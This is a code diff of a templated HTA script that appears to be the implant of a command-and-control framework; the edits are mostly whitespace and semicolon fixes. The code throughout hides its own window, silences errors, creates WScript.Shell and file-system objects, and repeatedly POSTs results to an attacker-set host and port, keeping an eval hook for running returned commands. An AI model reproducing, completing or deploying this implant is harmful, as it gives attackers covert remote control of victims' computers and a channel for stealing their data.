@@ -2,30 +2,30 @@
  <head>
  <script language="JScript">
 
- window.moveTo(-1000, -2000);
- window.blur();
- window.resizeTo(2, 4);
+window.moveTo(-1000, -2000);
+window.blur();
+window.resizeTo(2, 4);
 
- try
- {
-     window.onerror = function(sMsg, sUrl, sLine) { return false; }
-     window.onfocus = function() { window.blur(); }
- }
- catch (e){}
+try
+{
+   window.onerror = function(sMsg, sUrl, sLine) { return false; }
+   window.onfocus = function() { window.blur(); }
+}
+catch (e){}
 
 var {{variables['errors'][0]}} = {{variables['errors'][1]}};
-var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
+var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}};
 var {{variables['host'][0]}} = "{{variables['host'][1]}}";
 var {{variables['port'][0]}} = "{{variables['port'][1]}}";
 var {{variables['sleep'][0]}} = "{{variables['sleep'][1]}}";
 var {{variables['useragent'][0]}} = "{{variables['useragent'][1]}}";
 var {{variables['content-type'][0]}} = "{{variables['content-type'][1]}}";
 var {{variables['x-frame-options'][0]}} = "{{variables['x-frame-options'][1]}}";
-var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
+var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}};
 
 function {{variables['post-req'][0]}}(data){
   try {
-    var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}}
+    var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}};
     {{variables['winhttp.winhttprequest'][0]}}.Open('Post', 'http://{{variables['host'][1]}}:{{variables['port'][1]}}{{checkin_uri}}');
     {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
     {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("X-Frame-Options", "{{variables['x-frame-options'][1]}}");
@@ -69,7 +69,7 @@ function kill() {
 var results = '';
 var obj = { eval: eval };
 function main() {
-  window.setTimeout("main()", {{variables['sleep'][0]}}, "JScript")
+  window.setTimeout("main()", {{variables['sleep'][0]}}, "JScript");
   if(results != ''){
     response = {{variables['post-req'][0]}}(results);
     results = '';
@@ -87,7 +87,7 @@ function main() {
   } catch (e) {}
 }
 
-main()
+main();
 
  </script>
  <hta:application caption="no" windowtate="minimize" showInTaskBar="no" scroll="no" navigable="no" />
